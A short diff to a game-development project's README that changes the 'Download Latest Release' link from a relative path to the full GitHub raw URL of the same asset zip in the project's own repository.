@@ -1,3 +1,3 @@
 # GameDev
 
-[Download Latest Release](s4m_assets.zip)
+[Download Latest Release](https://github.com/SebastianKnabe/GameDev/raw/master/s4m_assets.zip)
